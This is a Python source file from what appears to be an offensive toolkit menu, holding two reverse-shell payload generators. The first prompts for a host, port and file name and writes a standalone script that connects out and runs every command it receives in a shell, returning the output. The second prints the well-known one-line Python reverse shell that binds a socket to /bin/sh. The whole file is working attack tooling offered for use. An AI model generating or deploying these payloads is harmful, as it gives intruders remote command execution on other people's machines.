from mods import a_main
def payfac():
       print('  Reverse Shell Payload')
       try:
              rhost = input('  Set Host: ')
              print('  [\033[1;32mOK\033[0;0m] - Remote Host: ', rhost)
       except:
              a_main()
       try:
              rport = int(input('  Set Port: '))
              print('  [\033[1;32mOK\033[0;0m] - Remote port: ', rport)
       except:
              a_main()


       con = ('import socket\n'
              'import os\n'
              'import subprocess\n'
              'target_host = "{}"\n'
              'target_port = {}\n'
              'client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n'
              'client.connect((target_host,target_port))\n'
              'while True:\n'
              '      data = client.recv(1024)\n'
              '      if data[:2].decode("utf-8") == "cd":\n'
              '             os.chdir(data[3:].decode("utf-8"))\n'
              '      if len(data) > 0:\n'
              '             cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )\n'
              '             output_bytes = cmd.stdout.read()\n'
              '             output_str = str(output_bytes, "utf-8")\n'
              '             client.send(str.encode(output_str + str(os.getcwd()) + "$"))\n'
              '      if  data[:2].decode("utf-8") == "quit":\n'
              '             client.close()\n'
              '             exit()'.format(rhost,rport))

       try:
              zfile = input('  set file name: ') + '.py'
              print('  [\033[1;32mOK\033[0;0m] - Remote Payload: ', zfile)

       except:
              pass

       new_file = open(zfile, 'w')
       new_file.write(con)
       new_file.close()
       print('  [\033[1;32mOK\033[0;0m] - Your payload was created.')
       input('press enter')
       a_main()

def payfac2():
       print('  Python Reverse Shell')
       try:
              rhost = input('  Set Host: ')
              print('  [\033[1;32mOK\033[0;0m] - Remote Host: ', rhost)
       except:
              a_main()
       try:
              rport = int(input('  Set Port: '))
              print('  [\033[1;32mOK\033[0;0m] - Remote port: ', rport)
       except:
              a_main()

       print("""
       python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
       """.format(rhost,rport))

       input('press enter')
       a_main.a_main()
